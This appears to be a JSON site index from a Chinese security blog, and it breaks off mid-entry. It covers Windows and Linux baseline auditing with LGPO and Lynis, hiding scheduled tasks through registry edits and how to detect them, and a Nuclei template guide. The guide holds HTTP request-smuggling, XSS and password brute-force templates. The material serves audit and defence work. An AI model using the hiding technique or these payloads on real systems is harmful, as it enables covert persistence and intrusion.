可选的GPO显示名称(如果包含空格，使用引号) To parse a Registry.pol file to LGPO text (stdout): # 解析注册表。pol文件到LGPO文本(stdout): LGPO.exe /parse [/q] {/m|/u|/ua|/un|/u:username} path\\registry.pol /m path\\registry.pol parse registry.pol as machine config commands /u path\\registry.pol parse registry.pol as user config commands /ua path\\registry.pol parse registry.pol as user config for Administrators /un path\\registry.pol parse registry.pol as user config for Non-Administrators /u:username path\\registry.pol parse registry.pol as user config for local user specified by \"username\" /q quiet output (no headers) To build a Registry.pol file from LGPO text: # 建立注册表。pol文件从LGPO文本: LGPO.exe /r path\\lgpo.txt /w path\\registry.pol [/v] /r path\\lgpo.txt Read input from LGPO text file /w path\\registry.pol Write new registry.pol file (See the documentation for more information and examples.) C:\\Users\\xt\u003eC:\\Users\\xt\\Desktop\\工具\\LGPO.exe使用LGPO导出策略。 使用管理员身份在LGPO.exe所在目录处运行cmd。 导出本地组策略 LGPO.exe /b path [/n GPO-name]\nC:\\Users\\xt\u003eC:\\Users\\xt\\Desktop\\工具\\LGPO.exe /b C:\\Users\\xt\\Desktop\\工具\\LGPO /n \"backup\" LGPO.exe - Local Group Policy Object Utility Version 3.0.2004.13001 Copyright (C) 2015-2020 Microsoft Corporation Security Compliance Toolkit - https://www.microsoft.com/download/details.aspx?id=55319 Creating LGPO backup in \"C:\\Users\\xt\\Desktop\\ C:\\Users\\xt\u003etree C:\\Users\\xt\\Desktop\\工具\\LGPO\\{F9B49312-D0EE-4223-BC1A-58916ABCFE5A} /F /A 文件夹 PATH 列表 卷序列号为 000000EF CCCF:ACF4 C:\\USERS\\XT\\DESKTOP\\工具\\LGPO\\{F9B49312-D0EE-4223-BC1A-58916ABCFE5A} | Backup.xml | Bkupinfo.xml | \\---DomainSysvol \\---GPO +---Machine | | registry.pol | | | \\---microsoft | \\---windows nt | +---Audit | | audit.csv | | | \\---SecEdit | GptTmpl.inf | \\---User registry.pol 使用LGPO导入策略 导入备份的LGPO策略\nC:\\Users\\xt\\Desktop\\工具\u003eLGPO.exe /g .\\LGPO\\{F9B49312-D0EE-4223-BC1A-58916ABCFE5A} LGPO.exe - Local Group Policy Object Utility Version 3.0.2004.13001 Copyright (C) 2015-2020 Microsoft Corporation Security Compliance Toolkit - https://www.microsoft.com/download/details.aspx?id=55319 Registering Machine CSE: Registry Policy, {35378EAC-683F-11D2-A89A-00C04FBBCFA2} Registering User CSE: Registry Policy, {35378EAC-683F-11D2-A89A-00C04FBBCFA2} Clearing existing audit policy Apply Audit policy from .\\LGPO\\{F9B49312-D0EE-4223-BC1A-58916ABCFE5A}\\DomainSysvol\\GPO\\Machine\\microsoft\\windows nt\\Audit\\audit.csv Apply security template: .\\LGPO\\{F9B49312-D0EE-4223-BC1A-58916ABCFE5A}\\DomainSysvol\\GPO\\Machine\\microsoft\\windows nt\\SecEdit\\GptTmpl.inf Import Machine settings from registry.pol: .\\LGPO\\{F9B49312-D0EE-4223-BC1A-58916ABCFE5A}\\DomainSysvol\\GPO\\Machine\\registry.pol Import User settings from registry.pol: .\\LGPO\\{F9B49312-D0EE-4223-BC1A-58916ABCFE5A}\\DomainSysvol\\GPO\\User\\registry.pol 导出的策略与windows基线对比 将基线和导出的pol文件导入Policy Anylize程序中。然后同时勾选对比即可。\n还可以导出结果\n参考： [MS-GPSB] 组策略安全扩展协议\n威胁和对策指南：Windows Server 2008 R2 和 Windows 7 中的安全设置\n安全审核https://docs.microsoft.com/zh-cn/windows/security/threat-protection/auditing/security-auditing-overview\nWindows 安全基准 https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-security-configuration-framework/windows-security-baselines\nLinux安全策略检查 linux安全基线 lynis Lynis 是一个开源安全工具。它有助于审核运行类 UNIX 系统（Linux、macOS、BSD）的系统，并为系统强化和合规性测试提供指导。本文档包含使用该软件的基础知识。\n官网地址：https://cisofy.com/documentation/lynis/\n项目地址：https://github.com/CISOfy/Lynis\n下载地址：https://cisofy.com/downloads/lynis/\n安装方式：https://cisofy.com/documentation/lynis/get-started/\n使用lynis安全检测 运行\n╭─xt@MacBook-Pro ~/Documents/hack/baseline/lynis-master ╰─$ ./lynis [ Lynis 3.0.7 ] ################################################################################ Lynis comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under the terms of the GNU General Public License. See the LICENSE file for details about using this software. 2007-2021, CISOfy - https://cisofy.com/lynis/ Enterprise support available (compliance, plugins, interface and tools) ################################################################################ [+] Initializing program ------------------------------------ Usage: lynis command [options] Command: audit audit system : Perform local security scan audit system remote \u003chost\u003e : Remote security scan audit dockerfile \u003cfile\u003e : Analyze Dockerfile show show : Show all commands show version : Show Lynis version show help : Show help update update info : Show update details Options: Alternative system audit modes --forensics : Perform forensics on a running or mounted system --pentest : Non-privileged, show points of interest for pentesting Layout options --no-colors : Don't use colors in output --quiet (-q) : No output --reverse-colors : Optimize color display for light backgrounds --reverse-colours : Optimize colour display for light backgrounds Misc options --debug : Debug logging to screen --no-log : Don't create a log file --profile \u003cprofile\u003e : Scan the system with the given profile file --view-manpage (--man) : View man page --verbose : Show more details on screen --version (-V) : Display version number and quit --wait : Wait between a set of tests --slow-warning \u003cseconds\u003e : Threshold for slow test warning in seconds (default 10) Enterprise options --plugindir \u003cpath\u003e : Define path of available plugins --upload : Upload data to central node More options available. Run './lynis show options', or use the man page.无配置运行 Lynis 无需任何预配置即可运行。配置和微调是可能的，将在后面的部分中介绍。现在我们将运行基本扫描：\nlynis audit system 快速模式 默认情况下，Lynis 在第一节之后开始和暂停。使用 CTRL+C 可以停止程序。使用 ENTER 它将继续进行下一组测试。如果我们想在没有任何停顿的情况下运行 Lynis，我们可以给它一个额外的参数：– quick。这将启用“快速”选项，非常适合在您做其他事情时运行 Lynis。\n命令举例 Command Description audit system Perform a system audit show commands Show available Lynis commands show help Provide a help screen show profiles Display discovered profiles show settings List all active settings from profiles show version Display current Lynis version 配置 Option Abbreviated Description –auditor “Given name Surname” Assign an auditor name to the audit (report) –cronjob Run Lynis as cronjob (includes -c -Q) –debug Show debug information, useful for troubleshooting and development –help -h Shows valid parameters –man-page View man page –no-colors Do not use any colors –pentest Perform a penetration test scan (non-privileged) –quick -Q Don’t wait for user input, except on errors –quiet -q Only show warnings (includes –quick, but doesn’t wait) –reverse-colors Use a different color scheme for lighter backgrounds –verbose Show more screen output 参考：\n德克萨斯州立大学 linux安全checklist https://gato-docs.its.txstate.edu/vpit-security/training/server-security/sans-linux-checklist/SANS_Linux_checklist.pdf\nSANS 研究所 linux安全checklisthttps://www.sans.org/media/score/checklists/LinuxCheatsheet_2.pdf\nhttps://security.uconn.edu/baseline-configuration-standard-linux/#\n检查表 [https://www.ucd.ie/t4cms/UCD%20Linux%20Security%20Checklist.pdf](https://www.ucd.ie/t4cms/UCD Linux Security Checklist.pdf)\nhttps://github.com/trimstray/the-practical-linux-hardening-guide\n云基线：\nhttps://github.com/Cloudneeti/Cloudneeti_SaaS_Docs/tree/62c8ec6b7d3b3a6a980277f58afba50bcb61b298\n",
    "description": "",
    "tags": null,
    "title": "安全策略检测",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E6%A3%80%E6%B5%8B/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "应急响应关键证据检索提取",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/index.html"
  },
  {
    "content": "计划任务隐藏 这里我们参考AnonySec的文章创建隐藏计划任务https://mp.weixin.qq.com/s/-G9aOm0mBh7eD7S5j9Lvog\n创建任务\nschtasks /create /tn TestSchtask /tr C:\\Windows\\System32\\cmd.exe /sc DAILY /st 13:00:00查询创建任务\nschtasks /query /TN TestSchtask /V /FO listId {GUID}，任务对应的guid编号。 Index 一般任务值为3，其他值未知。 SD Security Descriptor 安全描述符，在Windows中，每一个安全对象实体都拥有一个安全描述符，安全描述符包含了被保护对象相关联的安全信息的数据结构，它的作用主要是为了给操作系统提供判断来访对象的权限。\n1. 非完全隐藏计划任务方式- index设0 通过修改index值，为0进行隐藏。\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\n这里需要注意rugu 想要修改index值，那么攻击时需要调整权限属性，将注册表的管理者权限改为当前用户，以修改index值。\nwhoami可知当前用户为desktop-d9itqnu\\xt\nC:\\Users\\xt\u003ewhoami\ndesktop-d9itqnu\\xt\nschtasks.exe无法直接查到\n如果知道计划任务名称可以通过指定计划任务名称查询值：\n我们将index在改变值的前后schtasks的查询结果分别保存并对比，index=0导出保存为1.txt，将index=1导出保存为2.txt可以看到，结论一：确实在查询schtasks的时候由于index设置导致无法在schtasks查询到计划任务。\n并且在当前用户的计划任务UI中也是无法看到。\n应对方式 这时由于注册表没有改动，并且reg功能正常的情况下，我们是可以通过reg针对计划任务树查询并确定可疑的计划任务。\n直接查询注册表HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree中的计划任务树。 reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\" 针对可疑的计划任务我们仍然可疑通过schtasks指定计划任务名称查询。指定TestSchtask查询计划任务详情。 这里需要注意，由于index值为0，此时想要通过schtasks发现异常的任务项是无法获取index值为0的项目，此时通过对比注册表查询结果可以快速定位异常的注册表值，再通过schtasks指定任务名称可以强制查询得到对应详情。\nschtasks /query /TN TestSchtask /V /FO list 由于在修改index的时候需要注册表归属从原默认的system修改成当前用户，因此这个注册表的归属地方会有修改的痕迹 可以重点检查相关注册表的归属，确认痕迹：\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\n2. 完全隐藏计划任务方式 - SD 删除 删除 HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree{TaskName}\\SD\n删除 %SystemRoot%\\System32\\Tasks 下任务对应的 XML 文件\n这种情况对我们检查的影响是在schtasks查询的时候无法指定隐藏的计划任务查询详情了，我们仍然可以通过注册表来审计异常项，\n",
    "description": "",
    "tags": null,
    "title": "windows计划任务隐藏-检查方式",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/windows%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E9%9A%90%E8%97%8F-%E6%A3%80%E6%9F%A5%E6%96%B9%E5%BC%8F/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "系统入侵对抗研究",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "渗透工具",
    "uri": "/%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/index.html"
  },
  {
    "content": "参考：https://nuclei.projectdiscovery.io/templating-guide/\n模版详情 ID 每个模板都有一个唯一的 ID，在输出写入期间用于指定输出行的模板名称。 模板文件以YAML扩展名结尾。模板文件可以由您选择的任何文本编辑器创建。\nid: git-configID 不能包含空格。这样做是为了允许更容易的输出解析。\nINFO 信息 关于模板的下一个重要信息是信息块。信息块提供名称、作者、描述、严重性和标签。它还包含指示模板严重性的严重性字段，信息块也支持动态字段，因此可以定义 N 个key: value块以提供有关模板的更多有用信息。reference是另一个流行的标签，用于为模板定义外部参考链接。\n另一个始终添加到info块中的有用标签是tags。这可以让你一些自定义标签设置为一个模板，视象的目的cve，rce等等。这使核与输入标签识别模板，只运行它们。\n信息块示例 -\ninfo: name: Git Config File Detection Template author: Ice3man severity: medium description: Searches for the pattern /.git/config on passed URLs. tags: git,config实际请求和相应的匹配器放置在信息块下方，它们执行向目标服务器发出请求并查找模板请求是否成功的任务。\n每个模板文件可以包含多个要进行的请求。模板被迭代，并且一个一个地向目标站点发出所需的请求。\n基本请求 Nuclei 为与 HTTP 协议相关的各种功能提供广泛的支持。支持基于原始和模型的 HTTP 请求，以及非 RFC 客户端请求支持的选项。还可以指定有效负载，并且可以根据有效负载值以及本页面稍后显示的更多功能来转换原始请求。\nrequest HTTP 请求以一个request块开始，该块指定模板请求的开始。\n# Start the requests for the template right hererequests:method 根据需要，请求方法可以是GET、POST、PUT、DELETE等。\n# Method is the method for the requestmethod: GETredirects 可以为每个模板指定重定向条件。默认情况下，不遵循重定向。但是，如果需要，可以redirects: true在请求详细信息中启用它们。默认情况下最多跟随 10 个重定向，这对于大多数用例来说应该足够了。可以对重定向数量进行更细粒度的控制，然后使用max-redirects字段。\n用法用例：\nrequests: - method: GET path: - \"{{BaseURL}}/login.php\" redirects: true max-redirects: 3path 变量以开头{{和结尾，}}并且区分大小写。 {{BaseURL}} - 这将在请求中的运行时替换为目标文件中指定的原始 URL。 {{Hostname}} - Hostname 变量在运行时由目标的主机名替换。\n动态变量替换示例\npath: \"{{BaseURL}}/.git/config\"# This path will be replaced on execution with BaseURL# If BaseURL is set to https://abc.com then the# path will get replaced to the following: https://abc.com/.git/config也可以在为目标请求的一个请求中指定多个路径。\nheaders 还可以指定与请求一起发送的标头。标头以键/值对的形式放置。示例标头配置如下所示：\n# headers contains the headers for the requestheaders: # Custom user-agent header User-Agent: Some-Random-User-Agent # Custom request origin Origin: https://google.combody Body 指定要与请求一起发送的正文。\n# Body is a string sent along with the requestbody: \"{\\\"some random JSON\\\"}\"# Body is a string sent along with the requestbody: \"admin=test\"session 要维护基于 cookie 的浏览器，如多个请求之间的会话，您可以简单地cookie-reuse: true在模板中使用，在您希望在一系列请求之间维护会话以完成漏洞利用链并执行身份验证扫描的情况下很有用。\n# cookie-reuse accepts boolean input and false as defaultcookie-reuse: true请求条件 请求条件允许检查多个请求之间的条件，以编写复杂的检查和漏洞利用涉及多个 HTTP 请求以完成漏洞利用链。\n使用 DSL 匹配器，它可以通过添加req-condition: true和数字作为后缀来使用，例如status_code_1，具有各自的属性。status_code_3body_2\n关于DSL可以参见：https://www.cnblogs.com/xuwujing/p/11567053.html\nreq-condition: true matchers: - type: dsl dsl: - \"status_code_1 == 404 \u0026\u0026 status_code_2 == 200 \u0026\u0026 contains((body_2), 'secret_string')\"完整模版样例 最终模版文件可以看到如下所示\nid: git-configinfo: name: Git Config File author: Ice3man severity: medium description: Searches for the pattern /.git/config on passed URLs.requests: - method: GET path: - \"{{BaseURL}}/.git/config\" matchers: - type: word words: - \"[core]\"原始http请求 创建请求的另一种方法是使用原始请求，它具有更大的灵活性和对 DSL 辅助函数的支持，如下所示（目前建议将Host标头保留为示例中的变量{{Hostname}}）、所有匹配器、提取器功能可以以与上述相同的方式与 RAW 请求一起使用。\nrequests: - raw: - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Length: 1 Origin: https://www.google.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Accept-Language: en-US,en;q=0.9 a=test\u0026b=pd可以对请求进行微调以根据需要执行确切的任务。Nuclei 请求是完全可配置的，这意味着您可以配置和定义有关将发送到目标服务器的请求的每一件事。\nRAW 请求格式还支持各种帮助函数，让我们可以使用输入进行运行时操作。在标题中使用辅助函数的示例。\nraw: - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} # Helper function to encode input at run time. User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 Connection: closehttp模糊测试 信息\n核发动机支撑模糊化模块，其允许以运行各种类型在多个格式的有效载荷，这是可能的（或使用括号来定义与简单的关键词的占位符{{helper_function(variable)}}的情况下，增变器功能被需要），并执行狙击，杈和clusterbomb攻击。这些攻击的词表需要在 Payload 字段下的请求定义期间定义，名称与关键字匹配，Nuclei 支持基于文件和模板词表支持，最后所有 DSL 功能都完全可用和支持，可以使用操纵最终值。有效负载使用变量名称定义，可以在请求之间§ §或{{ }}标记中引用。使用带有本地词表的有效负载的示例：\nrequests: # HTTP Intruder fuzzing using local wordlist. - payloads: paths: params.txt header: local.txt使用具有模板词表支持的有效负载的示例： requests:\n# HTTP Intruder fuzzing using in template wordlist. - payloads: password: - admin - guest - password注意：-选择攻击类型时要小心，因为意外的输入会破坏模板。\n例如，如果您使用clusterbomb或pitchfork作为攻击类型并且仅在有效负载部分定义了一个变量，则模板将无法编译，因为clusterbomb或pitchfork期望在模板中使用多个变量。\n攻击方式 Nuclei 引擎支持多种攻击类型，包括sniper通常用于对单个参数进行模糊测试，clusterbomb以及pitchfork用于对多个参数进行模糊测试，其工作方式与经典的 burp intruder 相同。\nnuclei对burp intruder的三种爆破类型均支持。\nsniper sniper(狙击手) 模式仅使用一组有效载荷，并且一次仅替换一个位置。它遍历有效载荷集，首先仅用有效载荷替换第一个标记位置，并将所有其他位置保留为原始值。在完成第一个位置后，它继续第二个位置。\npitchfork pitchfork（交叉）攻击类型为每个位置使用一个有效载荷集。它将第一个有效载荷放在第一个位置，将第二个有效载荷放在第二个位置，依此类推。\n然后它同时循环遍历所有有效载荷集。第一个请求使用每个负载集中的第一个负载，第二个请求使用每个负载集中的第二个负载，依此类推。\nclusterbomb 集束炸弹攻击尝试所有不同的有效载荷组合。它仍然将第一个有效载荷放在第一个位置，将第二个有效载荷放在第二个位置。但是当它遍历有效载荷集时，它会尝试所有组合。\n然后它同时循环遍历所有有效载荷集。第一个请求使用每个负载集中的第一个负载，第二个请求使用每个负载集中的第二个负载，依此类推。\n这种攻击类型对于蛮力攻击很有用。在第一个负载集中加载常用用户名列表，在第二个负载集中加载常用密码列表。然后集束炸弹攻击将尝试所有组合。\n更多详情\n使用clusterbomb进行模糊测试示例：\nrequests: - payloads: path: helpers/wordlists/prams.txt header: helpers/wordlists/header.txt # Defining HTTP fuzz attack type attack: clusterbomb raw: - | POST /?file={{path}} HTTP/1.1 User-Agent: {{header}} Host: {{Hostname}}不安全的 HTTP 请求 Nuclei 支持rawhttp以实现完整的请求控制和自定义，允许针对 HTTP 请求走私、主机头注入、带有格式错误字符的 CRLF 等问题的任何类型的格式错误的请求。\nrawhttp库默认是禁用的，可以通过包含unsafe: true在请求块中来启用。\n下面是一个使用rawhttp.\nrequests: - raw: - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/\u003e\u003cscript\u003ealert(1)\u003c/script\u003e Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - |+ GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} # Enables rawhttp client unsafe: true matchers: - type: dsl dsl: - 'contains(body, \"\u003cscript\u003ealert(1)\u003c/script\u003e\")'高级模糊测试 我们丰富了核以允许对 Web 服务器进行高级模糊测试。用户现在可以使用多个选项来调整 HTTP 模糊测试工作流。\npipeline 添加了 HTTP pipeline流水线支持，允许在同一个连接上发送多个 HTTP 请求，其灵感来自http-desync-attacks-request-smuggling-reborn。\n在运行基于 HTTP 流水线的模板之前，请确保运行目标支持 HTTP 流水线连接，否则核引擎回退到标准 HTTP 请求引擎。\n如果你想确认给定的域或子域列表支持 HTTP Pipelining，httpx有一个标志-pipeline可以这样做。\n配置显示核的流水线属性的示例。\nunsafe: true pipeline: true pipeline-max-connections: 40 pipeline-max-workers: 25000下面提供了一个演示核的流水线功能的示例模板-\nid: pipeline-testing info: name: pipeline testing author: pdteam severity: info\nrequests:\n- payloads: path: path_wordlist.txt attack: sniper unsafe: true pipeline: true pipeline-max-connections: 40 pipeline-max-workers: 25000 raw: - |+ GET /§path§ HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Referer: {{BaseURL}} Connection: keep-alive matchers: - type: status part: header status: - 200Connection pooling Connection pooling连接池,虽然较早版本的 nuclei 没有进行连接池，但用户现在可以配置模板以使用或不使用 HTTP 连接池。这允许根据要求进行更快的扫描。\n要在模板中启用连接池，threads可以使用您想要在有效负载部分中使用的相应线程数定义属性。\nConnection: Close 标头不能在 HTTP 连接池模板中使用，否则引擎将失败并回退到带池的标准 HTTP 请求。\n使用 HTTP 连接池的示例模板 -\nid: fuzzing-exampleinfo: name: Connection pooling example author: pdteam severity: inforequests: - payloads: password: password.txt threads: 40 attack: sniper raw: - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:§password§')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 matchers-condition: and matchers: - type: status status: - 200 - type: word words: - \"Unique string\" part: body HTTP Smuggling HTTP Smuggling走私 是 Portswigger对该主题的研究最近流行起来的一类 Web 攻击。如需深入了解，请访问上面链接的文章。\n在开源领域，检测http走私是很困难的，特别是由于检测请求本质上是畸形的。Nuclei 能够利用rawhttp引擎可靠地检测 HTTP Smuggling漏洞。\nHTTP Smuggling 漏洞的最基本示例是 CL.TE Smuggling。下面提供了一个使用unsafe: true基于 rawhttp 请求的属性来检测 CE.TL HTTP Smuggling 漏洞的示例模板。\nid: CL.TE-http-smugglinginfo: name: HTTP request smuggling, basic CL.TE vulnerability author: pdteam severity: info lab: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-terequests: - raw: - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe: true matchers: - type: word words: - 'Unrecognized method GPOST'模板示例部分提供了更多示例，用于走私模板。\nRace condition testing Race condition testing竞争条件是另一类无法通过传统工具轻松自动化的错误。Burp Suite 为 Turbo Intruder 引入了一种 Gate 机制，其中所有请求的所有字节都被发送，除了最后一个字节外，只有所有同步发送事件的请求才会一起发送。\n我们在 nuclei 引擎中实现了Gate机制，并允许它们通过模板运行，这使得对这个特定错误类的测试变得简单和便携。\n要在模板中启用竞争条件检查，race可以将属性设置为true并race_count定义要发起的同时请求的数量。\n下面是一个示例模板，其中使用门逻辑将同一请求重复 10 次。\nid: race-condition-testinginfo: name: Race condition testing author: pdteam severity: inforequests: - raw: - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 promo_code=20OFF race: true race_count: 10 matchers: - type: status part: header status: - 200您可以简单地POST用任何可疑的易受攻击的请求替换该请求，并race_count根据您的需要进行更改，它就可以运行了。\nnuclei -t race.yaml -target https://api.target.comRace condition testing with multiple requests Race condition testing with multiple requests测试对于需要发送多个请求以利用竞争条件的场景，我们可以使用线程。\nthreads: 5 race: truethreads 是您希望使用模板进行竞争条件测试的请求总数。\n下面是一个示例模板，其中将使用门逻辑同时发送多个 (5) 唯一请求。\nid: multi-request-raceinfo: name: Race condition testing with multiple requests author: pd-team severity: inforequests: - raw: - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads: 5 race: trueheadless 无头情况 无头请求 Nuclei 通过简单的 DSL 支持浏览器的自动化。无头浏览器引擎可以完全自定义，用户操作可以编写脚本，允许完全控制浏览器。这允许各种独特和自定义的工作流程。\n# Start the requests for the template right hereheadless:Action行动 Action 是 Nuclei Headless Engine 的单个任务。每个动作都以某种方式操纵浏览器状态，最终导致我们感兴趣的状态捕获。\nNuclei 支持多种操作。下面给出了这些操作及其参数的列表-\nnavigate导航 navigate导航访问给定的 URL。URL字段支持变量一样{{BaseURL}}，{{Hostname}}完全自定义的要求。\naction: navigateargs: url: \"{{BaseURL}}script脚本 脚本在当前浏览器页面上运行一段 JS 代码。在最简单的层面上，您只需为code要执行的 JS 片段提供一个参数，它就会在页面上运行。\naction: scriptargs: code: alert(document.domain)假设你想在一个 JS 对象上运行一个匹配器来检查它的值。无头核也支持这种类型的数据提取用例。举个例子，假设应用程序设置了一个window.random-object用一个值调用的对象，并且您想要匹配该值。\n- action: script args: code: window.random-object name: script-name...matchers: - type: word part: script-name words: - \"some-value\"Nuclei 支持在使用hook参数加载页面之前运行一些自定义 Javascript 。这将始终在加载任何页面之前运行提供的 Javascript。\n该示例提供了钩子 window.alert，以便应用程序生成的警报不会停止爬虫。\n- action: script args: code: (function() { window.alert=function(){} })() hook: true这是一个用例，函数挂钩还有更多用例，例如 DOM XSS 检测和基于 Javascript 注入的测试技术。示例页面上提供了更多示例。\nclick点击 单击模拟使用鼠标左键单击选择器指定的元素。\naction: clickargs: by: xpath xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/inputNuclei 支持多种选择器类型，包括但不限于 XPath、Regex、CSS 等。有关选择器的更多信息，请参见此处。\nRightClick右键点击 RightClick 模拟使用鼠标右键单击选择器指定的元素。\naction: rightclickargs: by: xpath xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input文本 文本模拟使用键盘在输入中输入内容。选择器可用于指定要输入的元素。\naction: textargs: by: xpath xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value: username截屏 Screenshots 获取页面的屏幕截图并将其写入磁盘。它支持整页和普通屏幕截图。\naction: screenshotargs: to: /root/test/screenshot-web如果您需要整页屏幕截图，可以使用fullpage: trueargs 中的选项来实现。\naction: screenshotargs: to: /root/test/screenshot-web fullpage: true时间 时间以 RFC3339 格式将值输入到页面上的时间输入中。\naction: timeargs: by: xpath xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value: 2006-01-02T15:04:05Z07:00选择 Select 通过选择器对 HTML 输入执行选择。\naction: selectargs: by: xpath xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input selected: true value: option[value=two] selector: regexfiles 文件处理网页上的文件上传输入。\naction: filesargs: by: xpath xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value: /root/test/payload.txtWaitLoads等待负载 WaitLoads 等待页面完成加载并进入空闲状态。\naction: waitloadNuclei 的waitload操作等待 DOM 加载，并接收 window.onload 事件，然后我们等待页面空闲 1 秒。\nGetResource获取资源 GetResource 返回元素的 src 属性。\naction: getresourcename: extracted-value-srcargs: by: xpath xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/inputExtract提炼 Extract 提取 HTML 节点的文本或用户指定的属性。\n下面的代码将提取给定 XPath 选择器元素的文本，然后也可以extracted-value使用匹配器和提取器按名称进行匹配。\naction: extractname: extracted-valueargs: by: xpath xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input还可以为元素提取属性。例如 -\naction: extractname: extracted-value-hrefargs: by: xpath xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input target: attribute attribute: hrefSetMethod设置方法 SetMethod 覆盖请求的方法。\naction: setmethodargs: part: request method: DELETEAddHeader添加标题 AddHeader 向请求/响应添加标头。这不会覆盖任何预先存在的标头。\naction: addheaderargs: part: response # can be request too key: Content-Security-Policy value: \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\"SetHeader设置头 SetHeader 在请求/响应中设置标头。\naction: 